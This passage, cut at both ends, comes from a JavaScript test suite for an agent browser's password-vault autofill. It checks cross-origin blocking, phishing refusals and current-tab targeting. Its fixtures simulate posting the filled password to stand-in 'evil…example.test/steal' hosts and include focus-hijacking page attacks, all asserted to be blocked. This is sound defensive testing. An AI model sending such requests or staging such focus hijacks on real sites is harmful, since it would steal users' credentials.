    logB.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-r24');

    let holdersB = [{ browserKey: 'bk-r24', sessionId: 's-r24' }];
    const skB = {
      cdpEndpointFor: async () => ({ ok: true, url: fkStd.wsUrl }),
      onLease: () => () => {},
      saveLoginFenceState() {},
      loginFenceStateOf: () => null,
      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkStd.wsUrl), action }),
    };
    const wEvents = [];
    const wB = Dm.create({
      keeper: skB,
      log: quiet,
      enableTimeoutMs: 400,
      holdersOf: () => holdersB,
      leaseCountOf: () => holdersB.filter((h) => !h.human).length,
      logins: logB,
      forYou: { add: (_pid, it) => { fyB.push(it); return `fy-${fyB.length}`; }, resolve() {} },
      wipeMaxScanPositions: 1024,
      axMaxPayloadBytes: 4 * 1024 * 1024,
    });
    wB.onChange((ev) => wEvents.push(ev));
    await wB.arm('bp-r24');
    const tidB = fkStd.targets()[0].targetId;

    // 1. N1 (standard Chrome mode): hold state (`tooMuchText`) keeps '*' Request interception up and blocks foreign XHR/fetch!
    fkStd.setDom(tidB, {
      url: 'https://shop.example.test/login',
      elements: [
        { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
        { id: 'big', tag: 'textarea', type: 'textarea', name: 'Notes', value: 'x'.repeat(2400) },
      ],
    });
    wB.noteActiveTab({ profileId: 'bp-r24', browserKey: 'bk-r24' }, tidB);
    const fillHold = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      targetId: tidB, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const preHoldEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-n1.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch', finish: true });
    for (let i = 0; i < 30; i++) {
      const lv = wB.liveFillVerdictFor({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { verb: 'eval', argv: ['eval', '1'] });
      if (lv && /too much text/i.test(lv.error || lv.reason || '')) break;
      await new Promise((r) => setTimeout(r, 10));
    }
    const lvHold = wB.liveFillVerdictFor({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { verb: 'eval', argv: ['eval', '1'] });
    const postHoldEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-n1b.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    const holdXoNotices = fyB.filter((it) => it.kind === 'notice' && /Blocked a cross-origin request/.test(it.text || ''));
    ok(Boolean(fillHold?.ok) && preHoldEvil.action === 'fail' && !lvHold.ok && /too much text/i.test(lvHold.error || '')
      && postHoldEvil.action === 'fail' && postHoldEvil.errorReason === 'BlockedByClient' && holdXoNotices.length === 2,
      'N1 (standard Chrome mode): after wipe enters holdReason=tooMuchText, foreign Fetch/XHR is STILL BlockedByClient + 1 notice per destination',
      { preHoldEvil, lvHold, postHoldEvil, notices: holdXoNotices.length });

    // 2. N1 mode flip (`agent -> person -> agent`) while fence is live + second fill afterwards
    holdersB = [{ browserKey: 'bk-human', human: true, input: 'user' }];
    await wB.arm('bp-r24');
    await new Promise((r) => setTimeout(r, 25));
    const personEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-person.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    holdersB = [{ browserKey: 'bk-r24', sessionId: 's-r24' }];
    await wB.arm('bp-r24');
    await new Promise((r) => setTimeout(r, 25));
    const backAgentEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-agent.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    // Navigate away to clear the tooMuchText hold (which also sends Network.disable #1), then refill on clean DOM -> testing m2 Network.disable on same-origin wipe!
    const markBeforeNav = fkStd.mark();
    fkStd.navigate(tidB, 'https://shop.example.test/login');
    await new Promise((r) => setTimeout(r, 25));
    const navNetDisables = fkStd.calls().filter((c) => c.seq > markBeforeNav && c.method === 'Network.disable').length;
    fkStd.setDom(tidB, {
      url: 'https://shop.example.test/login',
      elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }],
    });
    const refillAfterFlip = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      targetId: tidB, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const afterRefillEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-refill.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    ok(personEvil.action === 'fail' && backAgentEvil.action === 'fail' && navNetDisables >= 1 && Boolean(refillAfterFlip?.ok) && afterRefillEvil.action === 'fail',
      'N1: agent -> person -> agent mode flip keeps * Fetch interception synced and blocks foreign POSTs before, during, and after refill',
      { personEvil, backAgentEvil, navNetDisables, refillAfterFlip: refillAfterFlip?.ok, afterRefillEvil });

    // 3. m2: once same-origin submit wipes and lifts the fence, `Network.disable` runs and 0 `Network.*` events reach hub
    const markBeforeLift = fkStd.mark();
    await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch', finish: true });
    // (B-518e, also — the gate's red on 5e3f0cd26 and earlier: a 40 × 10 ms limit on the lift. The lift is waited for by the facts
    // the leg reads: the fence gone (the verdict ok), Network.disable sent, and the tab's Fetch mode back off the credential
    // patterns (the tab's own state) — asked a bounded COUNT of times; the bound only ends a wait that never comes)
    const tabB = () => { const w = wB._watches && wB._watches.get('bp-r24'); return w ? [...w.targets.values()].find((x) => x && String(x.targetId).toUpperCase() === String(tidB).toUpperCase()) || null : null; };
    let m2Settled = false;
    for (let i = 0; i < 600 && !m2Settled; i++) {
      m2Settled = wB.liveFillVerdictFor({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { verb: 'eval', argv: ['eval', '1'] }).ok
        && fkStd.calls().some((c) => c.seq > markBeforeLift && c.method === 'Network.disable')
        && Boolean(tabB()) && !tabB().credNetEnabled && !/^all-/.test(String(tabB().fetchMode || ''));
      if (!m2Settled) await new Promise((r) => setTimeout(r, 10));
    }
    const netDisableCalls = fkStd.calls().filter((c) => c.seq > markBeforeLift && c.method === 'Network.disable');
    const rawCheck = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/poll', postData: 'ping=1', resourceType: 'Fetch', finish: true });
    await new Promise((r) => setTimeout(r, 20));
    ok(m2Settled && netDisableCalls.length >= 1 && rawCheck.action === 'unwatched',
      'm2: lifting the live-fill fence sends Network.disable and restores Document-only Fetch (subsequent XHR unwatched, 0 Network.* events)',
      { m2Settled, netDisables: netDisableCalls.length, fetchMode: tabB() && tabB().fetchMode, rawCheck });

    // 4. N2: 3,000-row page (`axPadBytes: 6000` => `getFullAXTree` would be > 18 MiB > 16 MiB watch maxPayload!)
    const rows3000 = [];
    const snapLines3000 = [];
    for (let i = 0; i < 3000; i++) {
      rows3000.push({ id: `r${i}`, tag: 'input', type: 'text', name: `row ${i}` });
      snapLines3000.push({ ref: `@e${i + 1}`, role: 'textbox', name: `row ${i}`, nth: 0 });
    }
    rows3000.push({ id: 'lpw', tag: 'input', type: 'password', name: 'Password' });
    snapLines3000.push({ ref: '@e3001', role: 'textbox', name: 'Password', nth: 0 });
    fkStd.setDom(tidB, { url: 'https://shop.example.test/big-table', elements: rows3000, axPadBytes: 6000 });
    const axMark0 = fkStd.mark();
    const downBeforeSnap = wEvents.filter((x) => x.kind === 'down').length;
    const ns3000 = await wB.noteSnapshot({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { parsedRefs: snapLines3000, targetId: tidB });
    const allCallsOnSnap = fkStd.calls().filter((c) => c.seq > axMark0);
    const axCallsOnSnap = allCallsOnSnap.filter((c) => /^Accessibility\./.test(c.method));
    const downAfterSnap = wEvents.filter((x) => x.kind === 'down').length;
    ok(Boolean(ns3000?.ok) && ns3000.count === 3001 && allCallsOnSnap.length === 0 && axCallsOnSnap.length === 0 && downAfterSnap === downBeforeSnap,
      'N2: snapshot on 3,000-row page makes 0 CDP / Accessibility.* calls and keeps watch open',
      { cdpCalls: allCallsOnSnap.length, axCalls: axCallsOnSnap.length, downDelta: downAfterSnap - downBeforeSnap });

    // Fill `@e3001` on that 3,000-row page -> bounded `Accessibility.queryAXTree` resolves `@e3001` (~6 KiB), 0 `getFullAXTree`, watch stays open!
    const axMark1 = fkStd.mark();
    const fill3000 = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      targetId: tidB, target: '@e3001', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const callsOnFill = fkStd.calls().filter((c) => c.seq > axMark1);
    const fullAxOnFill = callsOnFill.filter((c) => c.method === 'Accessibility.getFullAXTree');
    const queryAxOnFill = callsOnFill.filter((c) => c.method === 'Accessibility.queryAXTree');
    const downAfterFill = wEvents.filter((x) => x.kind === 'down').length;
    ok(Boolean(fill3000?.ok) && fkStd.readDomValues(tidB).lpw === PW_N1 && fullAxOnFill.length === 0 && queryAxOnFill.length === 1 && downAfterFill === downBeforeSnap,
      'N2: fill @e3001 --vault on 3,000-row page uses 1 bounded queryAXTree call (0 getFullAXTree), fills password, and keeps watch open',
      { fullAxOnFill: fullAxOnFill.length, queryAxOnFill: queryAxOnFill.length, downDelta: downAfterFill - downBeforeSnap });

    // Oversize AX reply (> 4 MiB on 3,000 unlabelled textboxes with `axPadBytes: 2000`) -> `target_not_found` naming limit, watch STILL open!
    fkStd.navigate(tidB, 'https://shop.example.test/unlabelled-huge');
    await new Promise((r) => setTimeout(r, 15));
    const unlabelled3000 = Array.from({ length: 3000 }, (_, i) => ({ id: `u${i}`, tag: 'input', type: 'password', name: '' }));
    fkStd.setDom(tidB, { url: 'https://shop.example.test/unlabelled-huge', elements: unlabelled3000, axPadBytes: 2000 });
    await wB.noteSnapshot({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: '', nth: 0 }], targetId: tidB });
    const fillOversize = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      targetId: tidB, target: '@e1', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const downAfterOversize = wEvents.filter((x) => x.kind === 'down').length;
    ok(!fillOversize.ok && fillOversize.code === 'target_not_found' && /limit|MiB/i.test(fillOversize.error || '') && downAfterOversize === downBeforeSnap,
      'N2: > 4 MiB AX reply on dedicated socket refuses target_not_found naming the safety limit and NEVER drops the watch socket',
      { fillOversize, downDelta: downAfterOversize - downBeforeSnap });

    // 5. N5 (Ruling A accidental focus-steal guard): Post-prepare DOM & macrotask steals (`mo-inert`, `focus`, `click`, `strip-inert`, `select`, `move`, `replace`) with `preInsertDelayMs: 25`
    fkStd.mode.preInsertDelayMs = 25;
    const attackModes = [
      ['mo-inert', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy', moStripInert: true }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap' }]],
      ['focus', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare' }]],
      ['click', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'click' }]],
      ['strip-inert', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'strip-inert' }]],
      ['select', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'select' }]],
      ['move', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'move' }]],
      ['replace', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'replace' }]],
    ];
    const n5Failures = [];
    for (const [atkName, els] of attackModes) {
      fkStd.setDom(tidB, { url: 'https://shop.example.test/login', elements: els });
      const rAtk = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
        targetId: tidB, target: '#trap', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
      });
      const valsAtk = fkStd.readDomValues(tidB);
      const countsAtk = fkStd.readDomInputCounts(tidB);
      const leaked = Object.entries(valsAtk).some(([k, v]) => k !== 'trap' && String(v || '').length > 0)
        || Object.entries(countsAtk).some(([k, c]) => k !== 'trap' && c.inputEvents > 0);
      // Either `inert` prevented focus from ever leaving `#trap` (`ok: true`, `#trap` holds `PW_N1`, 0 non-target chars/events),
      // OR the capture/MO guard tripped (`ok: false`, `login_form_changed`, `#trap` wiped empty, 0 non-target chars/events).
      const neutralized = Boolean(rAtk.ok && valsAtk.trap === PW_N1 && (atkName === 'focus' || atkName === 'click'));
      const guarded = Boolean(!rAtk.ok && rAtk.code === 'login_form_changed' && String(valsAtk.trap || '') === '');
      if (leaked || (!neutralized && !guarded)) {
        n5Failures.push({ atkName, rAtk, valsAtk, countsAtk });
      }
    }
    fkStd.mode.preInsertDelayMs = 0;
    ok(n5Failures.length === 0,
      'N5: all 7 post-prepare paths (mo-inert, focus, click, strip-inert, select, move, replace) land 0 chars & 0 insertText events outside target',
      n5Failures);

    wB.shutdown();
  } finally {
    LF?.clearAllFilledSecrets?.();
    engB.close();
    await fkStd.close();
    fs.rmSync(ROOT4B, { recursive: true, force: true });
  }
}

// ═══ ④c B-21cc (the coordinator's r2491; report fb-03ae550a21): ONE TAB — the vault fill acts on the conversation's CURRENT tab ═══
// Two owned tabs on two origins (made-up sites): the sign-in's (shop.example.test) and another (other.example.test). The watch's
// own active entry names the OTHER tab (the report's state: the current tab changed without a tab ack). The keeper answers the
// current tab (its session's own `tab list`): the fill judges and fills THAT tab — never the watch's entry, never «most recently
// seen». Unreadable ⇒ refused by name. RED: the release's pick (the watch's entry) judged the OTHER tab — the reported refusal.
console.log('④c B-21cc: the vault fill acts on the conversation\'s CURRENT tab — one tab judged and filled, no guess');
if (typeof LF?.resolveSnapshotRef === 'function') {
  const ROOT4C = scratch('vl-b21cc-current');
  fs.rmSync(ROOT4C, { recursive: true, force: true });
  fs.mkdirSync(ROOT4C, { recursive: true });
  const fkC = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
  const engC = VE.create({ dataDir: ROOT4C, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
  await engC.setup('B21ccProof#Master9');
  const wsC = [];
  try {
    const gC = GS.create({ memory: true });
    const lgC = Lm.create({ vault: engC, grants: () => gC, log: () => {}, forYou: { add: () => 'fy-1', resolve() {} } });
    const PW_C = 'B21ccCurrent!' + crypto.randomBytes(4).toString('hex');
    lgC.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_C }, { who: 'owner' });
    lgC.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-b21cc');
    let curAnswer = null, asked = 0;
    const mkKeeper = (withCurrent = true) => ({
      cdpEndpointFor: async () => ({ ok: true, url: fkC.wsUrl }),
      onLease: () => () => {},
      saveLoginFenceState() {},
      loginFenceStateOf: () => null,
      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkC.wsUrl), action }),
      ...(withCurrent ? { currentTabOf: async () => { asked++; return typeof curAnswer === 'function' ? curAnswer() : curAnswer; } } : {}),
    });
    const T = { profileId: 'bp-b21cc', browserKey: 'bk-b21cc' };
    const tidS = fkC.targets()[0].targetId;
    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    const tidO = fkC.addTarget('https://other.example.test/account');
    fkC.setDom(tidO, { url: 'https://other.example.test/account', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    const worldOn = async (Dmod, withCurrent = true) => {
      const w = Dmod.create({ keeper: mkKeeper(withCurrent), log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: T.browserKey, sessionId: 's-b21cc' }], leaseCountOf: () => 1, logins: lgC });
      wsC.push(w);
      await w.arm(T.profileId);
      for (let i = 0; i < 40; i++) { const a = await w.noteSnapshot(T, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'Password', nth: 0 }], targetId: tidO }); if (a && a.ok) break; await new Promise((r) => setTimeout(r, 10)); }
      for (let i = 0; i < 40; i++) { const a = await w.noteSnapshot(T, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'Password', nth: 0 }], targetId: tidS }); if (a && a.ok) break; await new Promise((r) => setTimeout(r, 10)); }
      w.noteActiveTab(T, tidO); // the watch's own entry: the OTHER tab (stale — the current tab moved without a tab ack)
      return w;
    };
    const fillC = (w) => w.fillVaultField(T, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc'] } });
    const valOf = (tid) => (fkC.readDomValues(tid) || {}).pw || '';
    // (1) the current tab is the sign-in's: the fill acts on IT
    const w1 = await worldOn(Dm);
    curAnswer = { ok: true, targetId: tidS }; asked = 0;
    const r1 = await fillC(w1);
    ok(!!(r1 && r1.ok) && valOf(tidS) === PW_C && valOf(tidO) === '' && asked === 1,
      'B-21cc: two owned tabs on two origins, the CURRENT one the sign-in\'s — the vault fill acts on IT (the value lands there, none in the other tab), whatever the watch\'s own entry says; the keeper asked once', { r1: r1 && { ok: r1.ok, code: r1.code, error: r1.error }, asked });
    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    // (2) the current tab is the OTHER site: refused, naming THAT site
    curAnswer = { ok: true, targetId: tidO };
    const r2 = await fillC(w1);
    ok(!!(r2 && !r2.ok && r2.code === 'login_phishing' && /other\.example\.test/.test(r2.error || '')) && valOf(tidS) === '' && valOf(tidO) === '',
      'B-21cc: the CURRENT tab on the OTHER site — refused login_phishing naming THAT site truly (the tab the conversation is on), nothing filled anywhere', { r2: r2 && { code: r2.code, error: r2.error } });
    // (3) the current tab cannot be read: refused by name — never the watch's entry, never «most recently seen»
    curAnswer = { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (its tab list did not answer) — nothing was filled; try again' };
    const r3 = await fillC(w1);
    curAnswer = () => { throw new Error('the gate: the read threw'); };
    const r3t = await fillC(w1);
    w1.shutdown();
    const w4 = await worldOn(Dm, false);
    const r4 = await fillC(w4);
    w4.shutdown();
    ok(!!(r3 && r3.code === 'current_tab_unreadable' && /did not answer/.test(r3.error) && r3t && r3t.code === 'current_tab_unreadable' && r4 && r4.code === 'current_tab_unreadable') && valOf(tidS) === '' && valOf(tidO) === '',
      'B-21cc: a current tab that cannot be read — its read refused, its read threw, no reader at all — the fill is REFUSED BY NAME (current_tab_unreadable), nothing filled: no guess', { r3: r3 && r3.code, r3t: r3t && r3t.code, r4: r4 && r4.code });
    const MC = mutantCopies('b21cc-current-tab', REPO);
    const bdSrcC = fs.readFileSync(path.join(REPO, 'src/server/browser-dialogs.js'), 'utf8');
    // round w41hvnm5h's must, as r2849 builds it: THE SNAPSHOT's REFERENCES go to the CURRENT tab — the note keeps them with NO read,
    // the fill adopts them on the tab IT reads. The route's own note names no tab (the driver's snapshot answer carries none), the
    // watch's entry stands on the OTHER tab; then a fill BY REFERENCE lands
    const w5 = await worldOn(Dm);
    curAnswer = { ok: true, targetId: tidS };
    const ns5 = await w5.noteSnapshot(T, { parsedRefs: [{ ref: '@e7', role: 'textbox', name: 'Password', nth: 0 }] }); // as the route passes it: no tab
    const r5 = await w5.fillVaultField(T, { target: '@e7', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc'] } });
    ok(!!(ns5 && ns5.ok && r5 && r5.ok) && valOf(tidS) === PW_C && valOf(tidO) === '',
      'B-21cc (round w41hvnm5h → r2849): the route\'s snapshot note (no tab) keeps the references with no read; the fill BY REFERENCE reads the CURRENT tab and adopts them THERE, though the watch\'s entry stands on the other — the value lands there', { ns5, r5: r5 && { ok: r5.ok, code: r5.code, error: r5.error } });
    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    // the read fails ⇒ nothing is written (the fill then refuses by name); the current tab NOT in scope ⇒ refused before any judgment
    curAnswer = { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (its tab list did not answer) — nothing was filled; try again' };
    const asked6 = asked;
    const ns6 = await w5.noteSnapshot(T, { parsedRefs: [{ ref: '@e9', role: 'textbox', name: 'Password', nth: 0 }] });
    const askedNote6 = asked - asked6;
    curAnswer = { ok: true, targetId: 'F'.repeat(32) };
    const r6 = await fillC(w5);
    ok(!!(ns6 && ns6.ok && ns6.pending && askedNote6 === 0 && r6 && r6.code === 'target_not_found' && /not one of its own pages here/.test(r6.error || '')) && valOf(tidS) === '' && valOf(tidO) === '',
      'B-21cc (r2849): the note asks nothing even where the read would fail (the snapshot is kept for the fill to judge); a current tab that is not one of this conversation\'s is refused target_not_found before any judgment — nothing filled', { ns6, askedNote6, r6: r6 && { code: r6.code, error: r6.error } });
    // the required small: the fill hands the tab it JUDGED (the refusal's frame sentence is asked of it); no tab judged ⇒ none
    curAnswer = { ok: true, targetId: tidS };
    const j7 = {}; const r7 = await w5.fillVaultField(T, { target: '#nope', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc'] }, judged: j7 });
    curAnswer = { ok: false, code: 'current_tab_unreadable', error: 'unreadable' };
    const j8 = {}; const r8 = await w5.fillVaultField(T, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc'] }, judged: j8 });
    ok(!!(r7 && !r7.ok && j7.targetId === tidS && r8 && r8.code === 'current_tab_unreadable' && j8.targetId === undefined),
      'B-21cc (round w41hvnm5h): a refusal after the judgment hands the tab it JUDGED (the frame sentence\'s only tab); an unreadable current tab judged none — no frame sentence', { r7: r7 && r7.code, j7, r8: r8 && r8.code, j8 });
    w5.shutdown();
    // RED: the release's snapshot note (the old pick) — the references land on the watch's entry, the OTHER tab; the fill by reference on the current one then fails
    const snapRel = anchored(bdSrcC, '    snapSlots.set(slotKey, { seq, at, tid: null, epoch: ep.seq, navSeqs, specs, unknown: false });\n    return { ok: true, targetId: null, count: specs.size, pending: true };\n', '    { const e = pickScopedTabFor(w, target, { targetId }); if (!e || !e.sid) return { ok: false, count: 0 }; writeSnapshotRefs(w, e, specs, { seq, at }); snapSlots.set(slotKey, { seq, at, tid: e.targetId, epoch: null, navSeqs: null, specs: null, unknown: false }); return { ok: true, targetId: e.targetId, count: specs.size }; }\n', 'B-21cc control: the release\'s snapshot pick');
    const DmSnap = MC.load('src/server/browser-dialogs.js', snapRel, 'release-snapshot-pick');
    const wS = await worldOn(DmSnap);
    curAnswer = { ok: true, targetId: tidS };
    const nsS = await wS.noteSnapshot(T, { parsedRefs: [{ ref: '@e7', role: 'textbox', name: 'Password', nth: 0 }] });
    const rS = await wS.fillVaultField(T, { target: '@e7', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc'] } });
    ok(!!(rS && !rS.ok && rS.code === 'target_not_found') && valOf(tidS) === '',
      'RED CONTROL (B-21cc, round w41hvnm5h): the release\'s snapshot note — the references were written to the watch\'s entry (the OTHER tab), so the fill BY REFERENCE on the current tab is refused target_not_found: the agent\'s retry loop', { nsS, rS: rS && { code: rS.code, error: rS.error } });
    wS.shutdown();
    // the order: a conversation with no tab of its own in scope is refused BEFORE its session is asked (a never-used session's `tab list` binds a tab)
    const fnC = bdSrcC.slice(bdSrcC.indexOf('  async function fillVaultField('), bdSrcC.indexOf('  async function fillVaultField(') + 9000);
    const ctC = bdSrcC.slice(bdSrcC.indexOf('  async function currentTabFor('), bdSrcC.indexOf('  async function currentTabFor(') + 1600);
    const nsC = bdSrcC.slice(bdSrcC.indexOf('  async function noteSnapshot('), bdSrcC.indexOf("  /** B-21cc (r2849): the conversation's NEWEST snapshot"));
    const nsUnnamed = nsC.slice(nsC.indexOf('    const ep = tabEpochOf('));
    ok(ctC.indexOf('if (!hasScopedTab(w, target))') > 0 && ctC.indexOf('if (!hasScopedTab(w, target))') < ctC.indexOf('keeper.currentTabOf(') && fnC.includes('const ct = await currentTabFor(w, target, targetId);') && bdSrcC.includes('const sv = snapshotForFill(w, target, e, { ep0, ep1 });') && nsC.length > 400 && !nsC.includes('currentTabFor(') && !nsC.includes('keeper.') && nsUnnamed.length > 100 && !nsUnnamed.includes('pickScopedTabFor(') && !nsUnnamed.includes('writeSnapshotRefs(') && (() => { const rs = fs.readFileSync(path.join(REPO, 'src/routes/browser.js'), 'utf8'); return rs.includes('await ctx.dialogs.noteSnapshot(tSnap, { parsedRefs: req.body.snapshotRefs.slice(0, 16384), since });') && rs.includes("const tidF = typeof ctx.dialogs.rememberedTabOf === 'function' ? ctx.dialogs.rememberedTabOf(tF) : null; otherSiteFrame = tidF ? ctx.dialogs.otherSiteFramesFor(tF, { targetId: tidF }) : null;"); })() && (() => { const rs = fs.readFileSync(path.join(REPO, 'src/routes/browser.js'), 'utf8'); return /judged\.targetId && typeof D\.otherSiteFramesFor === 'function'\) \{ try \{ framed = D\.otherSiteFramesFor\(t, \{ targetId: judged\.targetId, kind: 'vault' \}\)/.test(rs); })() && (() => { const rs = fs.readFileSync(path.join(REPO, 'src/routes/browser.js'), 'utf8'); const a = rs.indexOf('const r = await D.fillVaultField(t, {'); const b = rs.indexOf('});', a); return a > 0 && b > a && !/targetId/.test(rs.slice(a, b)); })(),
      'B-21cc (r2849): the FILL\'s one read (currentTabFor, asked only once the conversation has a tab of its own in scope) decides the snapshot it uses; the note makes NO read and, naming no tab, writes no tab\'s entry; the route\'s own note passes the verb\'s /resolve instant and no tab, its frame note is asked of the tab the watch knows without a read; the route hands the fill no tab of the caller\'s, and asks the refusal\'s frame sentence of the tab the fill JUDGED only');
    // RED: the release's pick (the watch's own entry, else «most recently seen») — the sign-in tab current, the OTHER judged
    const relSrc = anchored(bdSrcC, fnC.slice(fnC.indexOf('    const ct = await currentTabFor(w, target, targetId);\n'), fnC.indexOf("    if (!e || !e.sid) return { ok: false, code: 'target_not_found', error: targetId ?")), '    const e = pickScopedTabFor(w, target, { targetId });\n', 'B-21cc control: the release\'s pick');
    const DmRel = MC.load('src/server/browser-dialogs.js', relSrc, 'release-pick');
    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    const wR = await worldOn(DmRel);
    curAnswer = { ok: true, targetId: tidS };
    const rR = await fillC(wR);
    ok(!!(rR && !rR.ok && rR.code === 'login_phishing' && /other\.example\.test/.test(rR.error || '')) && valOf(tidS) === '',
      'RED CONTROL (B-21cc): the release\'s pick — the sign-in tab is the current one, yet the fill judged the watch\'s entry, the OTHER tab: refused login_phishing naming the other site (fb-03ae550a21, exactly)', { rR: rR && { code: rR.code, error: rR.error } });
    for (const r of copiesCensus(MC.files, MC.dir, REPO, { label: 'B-21cc controls: ' })) ok(r.pass, r.name, r.detail);
  } finally {
    for (const w of wsC) { try { w.shutdown(); } catch { } }
    LF?.clearAllFilledSecrets?.();
    engC.close();
    await fkC.close();
    fs.rmSync(ROOT4C, { recursive: true, force: true });
  }
}

// ═══ ④d B-21cc line 520's follow (主开发 r2760 → the lane's proposal → r2849): A SNAPSHOT MAKES NO READ — the fill decides by the tab epoch ═══
// A snapshot is the most asked verb of an agent browser and it gets no slower for a fill that may never come: the note keeps the
// conversation's NEWEST snapshot in ONE slot (references and counts only) with NO spawn and NO browser call; the fill, which reads the
// current tab anyway, adopts it only when no mover of the ONE list came between (the epoch the same before and after its read and the
// slot's own) and the tab has not navigated — else it refuses BY NAME and asks for a fresh snapshot. The SITE is judged on the tab the
// fill reads, whatever the slot says. Each condition of r2849 with its leg and its red; two made-up sites (shop / other .example.test).
console.log('④d B-21cc (r2849): the snapshot\'s note makes no read; the fill adopts the newest snapshot only when no mover came between');
if (typeof LF?.resolveSnapshotRef === 'function') {
  const ROOT4D = scratch('vl-b21cc-epoch');
  fs.rmSync(ROOT4D, { recursive: true, force: true });
  fs.mkdirSync(ROOT4D, { recursive: true });
  const fkD = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
  const engD = VE.create({ dataDir: ROOT4D, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
  await engD.setup('B21ccEpoch#Master9');
  const wsD = [];
  const sleepD = (ms) => new Promise((r) => setTimeout(r, ms));
  const waitD = async (pred, ms = 3000) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { if (await pred()) return true; await sleepD(15); } return false; };
  try {
